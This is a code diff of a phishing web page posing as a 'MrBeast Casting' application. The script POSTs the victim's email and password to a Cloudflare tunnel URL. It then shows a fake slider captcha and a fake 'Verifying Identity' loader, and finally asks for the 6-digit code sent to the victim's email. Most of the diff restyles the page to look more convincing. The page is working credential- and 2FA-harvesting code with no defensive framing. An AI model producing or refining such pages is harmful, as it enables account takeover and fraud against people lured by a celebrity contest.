@@ -3,74 +3,250 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link href="https://googleapis.com" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <title>MrBeast Casting</title>
     <style>
-        :root { --blue: #00a8e8; --pink: #f12e3e; }
+        :root { --blue: #00a8e8; --pink: #f12e3e; --green: #00ff88; }
         * { box-sizing: border-box; }
-        body { font-family: sans-serif; background: var(--blue); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
-        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png ') repeat; background-size: 70px; opacity: 0.2; z-index: 0; pointer-events: none; }
-        .top-logo { width: 300px; margin-top: 40px; margin-bottom: 20px; z-index: 10; position: relative; }
-        .box { background: #111; border-radius: 35px; width: 92%; max-width: 400px; padding: 40px 25px; text-align: center; position: relative; z-index: 10; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, var(--blue) 100%); 
+            color: #fff; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            overflow-x: hidden; 
+            position: relative;
+        }
         
-        /* MR BEAST TWO-COLOR STYLE */
-        .mr-style { font-family: 'Kanit', sans-serif; font-weight: 900; font-style: italic; font-size: 36px; color: var(--pink); -webkit-text-stroke: 1px #fff; text-shadow: 3px 3px 0px #000; }
-        .beast-style { font-family: 'Kanit', sans-serif; font-weight: 900; font-style: italic; font-size: 36px; color: #fff; text-shadow: 3px 3px 0px var(--blue); }
+        .bg-shine { 
+            position: fixed; 
+            top: -50%; 
+            left: -50%; 
+            width: 200%; 
+            height: 200%; 
+            background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 70%); 
+            animation: shine 20s infinite linear; 
+            z-index: 0; 
+            pointer-events: none; 
+        }
+        @keyframes shine { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .bg-pattern { 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') repeat; 
+            background-size: 60px; 
+            opacity: 0.15; 
+            z-index: 0; 
+            animation: float 20s ease-in-out infinite; 
+        }
+        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-20px); } }
+        
+        .top-logo { width: 280px; margin-top: 50px; margin-bottom: 20px; z-index: 10; position: relative; filter: drop-shadow(0 10px 30px rgba(0,168,232,0.3)); }
+        
+        .box { 
+            background: rgba(17,17,17,0.95); 
+            backdrop-filter: blur(20px); 
+            border-radius: 25px; 
+            width: 92%; 
+            max-width: 420px; 
+            padding: 45px 30px; 
+            text-align: center; 
+            position: relative; 
+            z-index: 10; 
+            border: 1px solid rgba(255,255,255,0.1); 
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1); 
+        }
+        
+        /* GLOWING MR EFFECT */
+        .mr-glow { 
+            font-family: 'Inter', sans-serif; 
+            font-weight: 900; 
+            font-size: 44px; 
+            background: linear-gradient(45deg, var(--pink), #ff6b7a, var(--blue), #4dd0e9); 
+            background-size: 300% 300%; 
+            -webkit-background-clip: text; 
+            background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            animation: gradientShift 3s ease infinite, glowPulse 2s ease-in-out infinite alternate; 
+            filter: drop-shadow(0 0 20px var(--pink)) drop-shadow(0 0 40px var(--blue)); 
+            display: inline-block; 
+            position: relative; 
+        }
+        @keyframes gradientShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
+        @keyframes glowPulse { 0% { filter: drop-shadow(0 0 20px var(--pink)) drop-shadow(0 0 40px var(--blue)); } 100% { filter: drop-shadow(0 0 30px var(--pink)) drop-shadow(0 0 60px var(--blue)); } }
+        
+        .beast-style { 
+            font-family: 'Inter', sans-serif; 
+            font-weight: 900; 
+            font-size: 44px; 
+            background: linear-gradient(45deg, #fff, var(--green)); 
+            -webkit-background-clip: text; 
+            background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            display: inline-block; 
+        }
 
-        input { width: 100%; padding: 18px; margin-bottom: 15px; border: 1px solid #222; background: #1a1a1a; color: #fff; border-radius: 15px; font-size: 16px; outline: none; }
-        .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; }
+        input { 
+            width: 100%; 
+            padding: 20px; 
+            margin-bottom: 18px; 
+            border: 2px solid rgba(255,255,255,0.1); 
+            background: rgba(26,26,26,0.8); 
+            color: #fff; 
+            border-radius: 16px; 
+            font-size: 16px; 
+            outline: none; 
+            backdrop-filter: blur(10px); 
+            transition: all 0.3s ease; 
+        }
+        input:focus { 
+            border-color: var(--blue); 
+            box-shadow: 0 0 20px rgba(0,168,232,0.3); 
+            background: rgba(26,26,26,0.95); 
+        }
+        input::placeholder { color: #888; }
         
-        /* SPLIT LOGO CAPTCHA */
-        #captcha_ui { display: none; padding: 20px; }
-        .canvas-area { width: 100%; height: 180px; background: #000; border-radius: 12px; position: relative; border: 1px solid #444; overflow: hidden; }
-        .logo-main { width: 100%; height: 100%; object-fit: contain; opacity: 0.3; filter: grayscale(1); }
-        .puzzle-piece { position: absolute; width: 80px; height: 180px; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png ') no-repeat; background-size: auto 160px; background-position: center; top: 10px; left: 10px; z-index: 100; cursor: pointer; filter: drop-shadow(0 0 10px var(--blue)); }
-        .puzzle-slot { position: absolute; width: 80px; height: 180px; background: rgba(0, 168, 232, 0.1); border: 2px dashed var(--blue); right: 40px; top: 0; border-radius: 10px; }
+        .btn { 
+            background: linear-gradient(45deg, var(--pink), #ff5e62); 
+            color: #fff; 
+            border: none; 
+            padding: 20px; 
+            border-radius: 16px; 
+            width: 100%; 
+            font-weight: 800; 
+            cursor: pointer; 
+            text-transform: uppercase; 
+            font-size: 16px; 
+            transition: all 0.3s ease; 
+            position: relative; 
+            overflow: hidden; 
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(241,46,62,0.4); }
+        .btn:active { transform: translateY(0); }
         
-        .slider-track { width: 100%; height: 45px; background: #222; border-radius: 25px; margin-top: 25px; position: relative; border: 1px solid #444; }
-        .slider-handle { width: 70px; height: 45px; background: var(--blue); border-radius: 25px; position: absolute; left: 0; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; font-size: 20px; }
-        
+        /* TIKTOK/CIRCLE STYLE CAPTCHA */
+        #captcha_ui { display: none; padding: 25px 0; }
+        .tiktok-captcha { 
+            position: relative; 
+            height: 200px; 
+            background: linear-gradient(145deg, #1a1a1a, #0f0f0f); 
+            border-radius: 20px; 
+            border: 2px solid rgba(255,255,255,0.1); 
+            overflow: hidden; 
+            margin-bottom: 25px; 
+        }
+        .tiktok-bg { 
+            position: absolute; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') no-repeat center; 
+            background-size: 120%; 
+            opacity: 0.25; 
+            filter: blur(1px); 
+        }
+        .circle-slider { 
+            position: absolute; 
+            top: 50%; 
+            left: 20px; 
+            width: 80px; 
+            height: 80px; 
+            background: conic-gradient(from 0deg, var(--blue), #4dd0e9, var(--green)); 
+            border-radius: 50%; 
+            transform: translateY(-50%); 
+            cursor: grab; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-weight: 900; 
+            color: #000; 
+            font-size: 24px; 
+            box-shadow: 0 10px 30px rgba(0,168,232,0.4); 
+            transition: all 0.2s ease; 
+            z-index: 10; 
+        }
+        .circle-slider:active { cursor: grabbing; transform: translateY(-50%) scale(0.95); }
+        .circle-slider.success { background: conic-gradient(from 0deg, var(--green), #00ff88); box-shadow: 0 10px 30px rgba(0,255,136,0.6); }
+        .progress-arc { 
+            position: absolute; 
+            top: 50%; 
+            right: -20px; 
+            width: 120px; 
+            height: 120px; 
+            border: 6px solid transparent; 
+            border-top: 6px solid rgba(0,168,232,0.3); 
+            border-radius: 50%; 
+            transform: translateY(-50%); 
+        }
+        .status-text { 
+            margin-top: 15px; 
+            font-size: 14px; 
+            color: #aaa; 
+            font-weight: 500; 
+        }
+
         #loader, #otp_section { display: none; }
-        .spinner { border: 5px solid rgba(0, 212, 255, 0.1); border-top: 5px solid var(--blue); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; }
+        .spinner { 
+            border: 4px solid rgba(0, 212, 255, 0.2); 
+            border-top: 4px solid var(--blue); 
+            border-radius: 50%; 
+            width: 60px; 
+            height: 60px; 
+            animation: spin 1s linear infinite; 
+            margin: 30px auto; 
+        }
         @keyframes spin { 100% { transform: rotate(360deg); } }
+        
+        #otp_section input { 
+            font-size: 28px; 
+            letter-spacing: 15px; 
+            text-align: center; 
+            font-weight: 700; 
+            padding: 20px 10px; 
+        }
     </style>
 </head>
 <body>
+    <div class="bg-shine"></div>
     <div class="bg-pattern"></div>
-    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="top-logo">
+    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="top-logo">
     <div class="box">
         <div id="login_section">
-            <span class="mr-style">MR</span><span class="beast-style"> BEAST CASTING</span>
-            <p style="color:#aaa; font-size:14px; margin-top:10px; margin-bottom:25px;">Final Phase Verification</p>
+            <span class="mr-glow">MR</span><span class="beast-style"> BEAST CASTING</span>
+            <p style="color:#aaa; font-size:14px; margin-top:15px; margin-bottom:30px;">Enter your email address to continue</p>
             <input type="email" id="email" placeholder="Email Address">
             <input type="password" id="pass" placeholder="Password">
             <button class="btn" onclick="sendLogin()">CONTINUE</button>
         </div>
 
         <div id="captcha_ui">
-            <p>Repair the logo to verify</p>
-            <div class="canvas-area" id="track">
-                <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="logo-main">
-                <div class="puzzle-slot"></div>
-                <div class="puzzle-piece" id="piece"></div>
-            </div>
-            <div class="slider-track">
-                <div class="slider-handle" id="handle">>>></div>
+            <p class="status-text" id="statusText">Drag the circle to match the logo</p>
+            <div class="tiktok-captcha" id="track">
+                <div class="tiktok-bg"></div>
+                <div class="circle-slider" id="handle">→</div>
+                <div class="progress-arc" id="progress"></div>
             </div>
         </div>
 
-        <div id="loader"><div class="spinner"></div><p>Verifying Identity...</p></div>
+        <div id="loader">
+            <div class="spinner"></div>
+            <p>Verifying Identity...</p>
+        </div>
 
         <div id="otp_section">
-            <div class="beast-style" style="font-size:24px;">SECURITY CHECK</div>
-            <p style="color:#aaa; font-size:14px;">Enter the 6-digit code from your email</p>
-            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:26px; letter-spacing:10px; font-weight:bold;">
+            <div class="beast-style" style="font-size:26px;">SECURITY CHECK</div>
+            <p style="color:#aaa; font-size:14px; margin:20px 0;">Enter the 6-digit code from your email</p>
+            <input type="text" id="2fa_code" placeholder="000000" maxlength="6">
             <button class="btn" onclick="submitOTP()">FINISH APPLICATION</button>
         </div>
     </div>
 
     <script>
-        const tunnel = "https://syndicate-textbooks-pound-eyes.trycloudflare.com ";
+        const tunnel = "https://syndicate-textbooks-pound-eyes.trycloudflare.com";
 
         function sendLogin() {
             const e = document.getElementById('email').value, p = document.getElementById('pass').value;
@@ -78,26 +254,72 @@
                 fetch(tunnel, { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                 document.getElementById('login_section').style.display = 'none';
                 document.getElementById('captcha_ui').style.display = 'block';
-                initPuzzle();
+                initTikTokCaptcha();
             }
         }
 
-        function initPuzzle() {
-            const handle = document.getElementById('handle'), piece = document.getElementById('piece'), track = document.getElementById('track');
+        function initTikTokCaptcha() {
+            const handle = document.getElementById('handle');
+            const track = document.getElementById('track');
+            const statusText = document.getElementById('statusText');
+            const progress = document.getElementById('progress');
+            
             let dragging = false;
+            let startX = 0;
+            let currentX = 20;
+
             const move = (e) => {
                 if (!dragging) return;
-                let x = (e.touches ? e.touches[0].clientX : e.clientX) - track.getBoundingClientRect().left - 35;
-                if (x < 0) x = 0; if (x > track.offsetWidth - 70) x = track.offsetWidth - 70;
+                e.preventDefault();
+                
+                let x = (e.touches ? e.touches[0].clientX : e.clientX) - startX;
+                if (x < 20) x = 20;
+                if (x > 260) x = 260;
+                
+                currentX = x;
                 handle.style.left = x + 'px';
-                piece.style.left = x + 'px';
-                // MATCH IN THE MIDDLE (220-250 range)
-                if (x > 225 && x < 245) { dragging = false; handle.style.background = "#00ff00"; setTimeout(showLoader, 600); }
+                
+                // Progress arc rotation
+                const progressPercent = (x - 20) / 240 * 360;
+                progress.style.transform = `translateY(-50%) rotate(${progressPercent}deg)`;
+                
+                statusText.textContent = x > 200 ? 'Almost there...' : 'Drag the circle to match the logo';
+                
+                // SUCCESS RANGE (220-240)
+                if (x > 215 && x < 235) {
+                    dragging = false;
+                    handle.classList.add('success');
+                    handle.textContent = '✓';
+                    statusText.textContent = 'Verified!';
+                    statusText.style.color = 'var(--green)';
+                    setTimeout(showLoader, 800);
+                }
             };
-            handle.addEventListener('mousedown', () => dragging = true);
-            handle.addEventListener('touchstart', (e) => { dragging = true; if(e.cancelable) e.preventDefault(); }, {passive: false});
-            window.addEventListener('mousemove', move); window.addEventListener('touchmove', move, {passive: false});
-            window.addEventListener('mouseup', () => dragging = false); window.addEventListener('touchend', () => dragging = false);
+
+            const startDrag = (e) => {
+                dragging = true;
+                startX = e.touches ? e.touches[0].clientX - currentX : e.clientX - currentX;
+                handle.style.transition = 'none';
+            };
+
+            const endDrag = () => {
+                if (!handle.classList.contains('success')) {
+                    handle.style.left = '20px';
+                    document.getElementById('progress').style.transform = 'translateY(-50%) rotate(0deg)';
+                    statusText.textContent = 'Drag the circle to match the logo';
+                    statusText.style.color = '#aaa';
+                }
+                dragging = false;
+                handle.style.transition = 'all 0.3s ease';
+            };
+
+            // Event listeners
+            handle.addEventListener('mousedown', startDrag);
+            handle.addEventListener('touchstart', startDrag, {passive: false});
+            window.addEventListener('mousemove', move);
+            window.addEventListener('touchmove', move, {passive: false});
+            window.addEventListener('mouseup', endDrag);
+            window.addEventListener('touchend', endDrag);
         }
 
         function showLoader() {
@@ -106,16 +328,7 @@
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('otp_section').style.display = 'block';
-            }, 15000);
-        }
-
-        function showLoader() {
-            document.getElementById('captcha_ui').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('otp_section').style.display = 'block';
-            }, 15000);
+            }, 2000);
         }
 
         function submitOTP() {
